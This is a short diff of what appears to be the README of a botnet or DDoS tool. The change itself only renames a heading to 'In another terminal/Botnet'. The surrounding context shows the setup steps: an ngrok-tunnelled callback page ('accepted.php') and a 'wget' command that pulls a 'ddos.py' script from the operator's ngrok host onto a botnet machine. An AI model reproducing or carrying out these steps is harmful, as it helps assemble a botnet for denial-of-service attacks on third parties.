@@ -24,7 +24,7 @@ KKey-aph: https://<ngrok link>/accepted.php
 
 
 ---
-## Setup botnet receiver (In another terminal)
+## Setup botnet receiver (In another terminal/Botnet)
 - You need another terminal for your botnet.
 ``` bash
 wget https://<ngrok link>/ddos.py
